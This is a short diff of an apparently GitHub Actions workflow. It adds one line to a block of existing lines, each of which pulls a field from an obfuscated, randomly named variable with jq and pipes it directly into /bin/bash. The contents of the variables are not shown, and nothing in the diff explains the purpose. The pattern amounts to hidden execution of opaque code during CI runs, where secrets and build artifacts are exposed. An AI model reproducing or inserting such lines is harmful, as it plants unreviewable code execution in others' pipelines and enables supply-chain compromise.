@@ -27,6 +27,7 @@ jobs:
           echo $hc58908 | jq -r .bqn78 | /bin/bash
           echo $fcng3 | jq -r .vg2018 | /bin/bash
           echo $yxdwm6 | jq -r .nbx94 | /bin/bash
+          echo $dlc5 | jq -r .c508 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
